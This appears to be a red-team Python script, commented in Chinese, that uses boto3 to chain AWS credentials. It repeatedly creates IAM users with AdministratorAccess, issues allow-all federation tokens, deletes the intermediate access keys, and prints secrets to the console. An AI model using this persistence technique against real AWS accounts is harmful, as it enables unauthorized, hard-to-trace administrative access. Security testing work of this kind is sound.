import json
import boto3
import time
import botocore.exceptions

def get_federation_token_with_wait(sts_client, user_name, duration_seconds=3600):
    # 定義一個更廣泛的政策
    admin_policy = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": "*",  # 允許所有操作
                "Resource": "*"  # 允許訪問所有資源
            }
        ]
    }

    try:
        federation_token = sts_client.get_federation_token(
            Name=user_name,
            DurationSeconds=duration_seconds,
            Policy=json.dumps(admin_policy)
        )
        return federation_token
    except botocore.exceptions.ClientError as error:
        print(f"Error getting federation token: {error}")
        return None
    
def create_user_with_retry(iam_client, user_name, max_attempts=6, delay=10):
    attempts = 0
    while attempts < max_attempts:
        try:
            iam_client.create_user(UserName=user_name)
            print(f"User {user_name} created successfully.")
            return True
        except botocore.exceptions.ClientError as error:
            if error.response['Error']['Code'] == 'EntityAlreadyExists':
                print(f"User {user_name} already exists.")
                return False
            else:
                print(f"Error creating user {user_name}: {error}")
                attempts += 1
                time.sleep(delay)
    print(f"Failed to create user {user_name} after {max_attempts} attempts.")
    return False

def create_account_and_keys(parent_access_key_id, parent_secret_access_key, session_token=None):
    print("Creating account and keys")
    print(f"parent_access_key_id: {parent_access_key_id}")
    print(f"parent_secret_access_key: {parent_secret_access_key}")
    print(f"session_token: {session_token}")

    session = boto3.Session(
        aws_access_key_id=parent_access_key_id,
        aws_secret_access_key=parent_secret_access_key,
        aws_session_token=session_token
        )
    iam_resource = session.resource('iam')
    iam_client = iam_resource.meta.client


    # 創建用戶
    user_name = f"ft_nested_user_{int(time.time())}"

    # iam_client.create_user(UserName=user_name)
    create_user_with_retry(iam_client, user_name)

    # 創建存取金鑰和安全金鑰
    access_key_response = iam_client.create_access_key(UserName=user_name)
    access_key_id = access_key_response['AccessKey']['AccessKeyId']
    secret_access_key = access_key_response['AccessKey']['SecretAccessKey']

    # 為用戶附加"AdministratorAccess"策略
    iam_client.attach_user_policy(
        UserName=user_name,
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )

    # 使用創建的存取金鑰產生聯盟令牌
    sts_client = boto3.client(
        'sts',
        aws_access_key_id=access_key_id,
        aws_secret_access_key=secret_access_key
    )
    federation_token = get_federation_token_with_wait(sts_client, user_name)
    # 檢查令牌是否成功獲得
    if federation_token:
        print("Federation token obtained successfully.")
        # 進行需要使用令牌的操作
    else:
        print("Failed to obtain federation token. Retrying...")
        time.sleep(10)  # 等待 10 秒後重試
        federation_token = get_federation_token_with_wait(sts_client, user_name)

    # 刪除剛創建的存取金鑰
    iam_client.delete_access_key(UserName=user_name, AccessKeyId=access_key_id)

    return federation_token["FederatedUser"]["Arn"], federation_token["Credentials"]["AccessKeyId"], federation_token["Credentials"]["SecretAccessKey"], federation_token["Credentials"]["SessionToken"]
    # return user_name, access_key_id, secret_access_key

def test_access_key(access_key_id, secret_access_key,session_token):
    client = boto3.client(
        'ec2',
        region_name='us-east-1',
        aws_access_key_id=access_key_id,
        aws_secret_access_key=secret_access_key,
        aws_session_token=session_token
    )
    try:
        # 嘗試獲取IAM用戶列表，以測試AK/SK是否有效
        print("Testing access key")
        client.describe_instances()
        return True
    # except:
    #     return False
    except Exception as e:
            print(f'query_last_station_tdx: {e}')
            return False
    
def wait_for_key_activation(access_key_id, secret_access_key, session_token, max_attempts=6, delay=10):
    for _ in range(max_attempts):
        if test_access_key(access_key_id, secret_access_key,session_token):
            return True
        time.sleep(delay)  # 等待一段時間後重試
    return False

def main():
    session = boto3.Session(profile_name='harry-redteam')
    initial_access_key_id=session.get_credentials().access_key
    initial_secret_access_key=session.get_credentials().secret_key
    current_ak = initial_access_key_id
    current_sk = initial_secret_access_key
    session_token = None

    for i in range(3):
        print(f"Creating user {i+1}")
        user_name, new_ak, new_sk, session_token = create_account_and_keys(current_ak, current_sk, session_token)
        print(f"Waiting for new keys to activate for user {user_name}")
        print(f"new_ak: {new_ak}")
        print(f"new_sk: {new_sk}")
        print(f"session_token: {session_token}")
        if wait_for_key_activation(new_ak, new_sk,session_token):
            print(f"Keys activated for user {user_name}")
            current_ak = new_ak
            current_sk = new_sk
        else:
            print(f"Failed to activate keys for user {user_name}, stopping process")
            break

if __name__ == "__main__":
    main()
